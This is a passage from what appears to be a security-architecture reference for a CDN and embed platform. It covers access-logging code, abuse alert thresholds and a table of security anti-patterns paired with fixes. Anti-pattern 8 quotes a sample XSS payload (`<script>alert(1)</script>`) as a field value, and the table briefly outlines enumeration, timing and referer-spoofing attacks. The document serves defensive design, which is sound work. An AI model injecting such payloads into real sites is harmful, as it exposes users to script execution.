  readonly clientIp: string;
  readonly userAgent: string;
  readonly referer: string | null;
  readonly origin: string | null;
  readonly responseStatus: number;
  readonly responseBytes: number;
  readonly cacheStatus: 'HIT' | 'MISS' | 'BYPASS' | 'EXPIRED';
  readonly country: string | null;
  readonly asn: number | null;
  readonly isHoneypot: boolean;
}

/**
 * Log resource access for abuse detection and forensics.
 * Sent to an observability pipeline (Sentry, Axiom, Datadog, or custom).
 *
 * Privacy: IP addresses are hashed after 30 days per GDPR data
 * minimization (Art. 5(1)(c)). Full IPs retained only during active
 * abuse investigation.
 */
export function logResourceAccess(event: ResourceAccessEvent): void {
  // Fire-and-forget -- never block the response on logging
  void fetch(process.env.LOG_ENDPOINT!, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(event),
  }).catch(() => {
    // Logging failure must never break the CDN response
  });
}
```

### 7.3 Alert Thresholds

| Severity | Condition | Response |
|----------|----------|----------|
| INFO | Single IP exceeds manifest rate limit | Auto rate-limit, log |
| WARN | IP hits honeypot resource ID | Auto-block IP for 24h, alert on-call |
| WARN | >50 unique resource IDs from single IP in 1 hour | Auto rate-limit, notify team |
| HIGH | Resource JSON downloaded >10,000 times in 1 hour (unusual spike) | Investigate, check for scraper |
| CRITICAL | Signed URL verification failures spike >100/hour | Possible key compromise, rotate secret |
| CRITICAL | Bulk context-loss reports from single resource | Possible compute abuse, quarantine resource |

### 7.4 Integration with Observability Stack

```
CDN log-push → object store → log analytics (Datadog / Axiom / etc.)
                                    ↓
                            Alert rules → on-call (Slack / PagerDuty)
                                    ↓
                            Dashboard: CDN abuse metrics
                                    ↓
                            Auto-remediation: WAF/CDN API → block IP/ASN
```

For a minimal deployment, use your hosting platform's analytics + an error tracker (e.g. Sentry):

- Error tracker: capture context-loss events, signed-URL failures, rate-limit hits
- Platform analytics: track CDN response times, cache hit rates, error rates
- Custom dashboard: resource access patterns, top requesters, geographic distribution

---

## 8. Anti-Patterns Table

| # | Anti-Pattern | Why It Fails | Correct Approach |
|---|-------------|-------------|-----------------|
| 1 | Sequential integer resource IDs | Trivially enumerable -- attacker iterates 1, 2, 3... to find all resources | UUIDv4 for resource IDs. 2^122 keyspace makes brute force infeasible |
| 2 | CORS as access control for private resources | CORS is browser-enforced only. `curl` and server-side code bypass it entirely | Signed URLs with HMAC verification at the edge |
| 3 | `Referer` header as sole hotlink defense | Missing in ~15% of requests (privacy settings, HTTPS-to-HTTP). Trivially spoofed | Referer as one signal + signed embed tokens + origin allowlist |
| 4 | `eval()` or `new Function()` in embed runtime | Creates XSS vector. Violates CSP `script-src 'self'`. Allows arbitrary code execution | Allowlist of `data-embed-*` attributes. Parse values as data, never execute |
| 5 | No size limits on resource JSON | Memory bomb: 500MB JSON exhausts server memory during parsing and CDN storage budget | Hard limit: 512KB max resource JSON. Validate at publish endpoint |
| 6 | String comparison (`===`) for HMAC signatures | Timing attack: attacker measures response time to guess signature byte-by-byte (CWE-208) | `crypto.timingSafeEqual()` for all signature comparisons |
| 7 | Rate limiting only at the application layer | Volumetric attacks hit origin before app code runs, exhausting compute budget | Three-layer: CDN/WAF (edge) + origin edge middleware + API handler |
| 8 | Trusting resource JSON strings for DOM insertion | XSS: `resource.name = "<script>alert(1)</script>"` renders as executable HTML | HTML-escape all strings. Use `textContent`, never `innerHTML` for user data |
| 9 | Unbounded loops in user-supplied workloads | Device/GPU hang, then context loss. Repeated hangs crash the tab | Server-side static analysis: max iteration count, max nesting depth |
| 10 | Logging full request bodies in access logs | PII exposure, storage cost explosion, GDPR violation for EU users | Log metadata only: IP (hashed after 30d), path, status, cache status |
| 11 | Open `postMessage` listener without origin check | Any script on the parent page can send spoofed messages to the embed iframe | Verify `event.origin` against allowlist before processing any message |
| 12 | Blocking requests with missing `Referer` | Breaks legitimate traffic: privacy-conscious browsers, direct navigation, bookmarks | Allow missing referer. Block only known-bad referers. Use signed tokens for real auth |
| 13 | Single global CDN signing secret with no rotation | Key compromise exposes ALL private resources. No way to revoke without breaking all URLs | Per-resource or per-user signing keys. Key rotation with grace period for old signatures |
| 14 | No honeypot detection | Enumeration attacks go undetected until bandwidth bill arrives | Deploy honeypot resource IDs. Alert on any access. Auto-block offending IPs |

---

## 9. See Also

### Within the `security-architecture` skill
- `references/client-pipeline-security-patterns.md` -- CSP, upload sanitization, untrusted-code safety, CORS, export security
- `references/01-security-review.md` -- Security review methodology, SAST, vulnerability scanning
- `references/02-fullstack-security.md` -- Auth, API security, database security

### Related project skills (if present)
- The project's CDN/object-store skill -- CORS header configuration, signed URLs, versioned immutable URLs, cache TTLs and cache-key normalization
- The project's publish-pipeline skill -- editor-metadata stripping, allowlist-based sanitization, publish-flow validation
- The project's runtime/embed skill -- client context-loss handling in the embed runtime

### External References
- OWASP Content Security Policy Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- Cloudflare Rate Limiting documentation (https://developers.cloudflare.com/waf/rate-limiting-rules/)
- RFC 2104: HMAC -- Keyed-Hashing for Message Authentication (https://datatracker.ietf.org/doc/html/rfc2104)
- RFC 9110: HTTP Semantics, Section 10.1.3 (Referer) (https://datatracker.ietf.org/doc/html/rfc9110#section-10.1.3)
- NIST SP 800-107: Recommendations for Applications Using Approved Hash Algorithms (https://csrc.nist.gov/publications/detail/sp/800-107/rev-1/final)
- CWE-208: Observable Timing Discrepancy (https://cwe.mitre.org/data/definitions/208.html)
- Subresource Integrity (SRI) specification (https://www.w3.org/TR/SRI/)
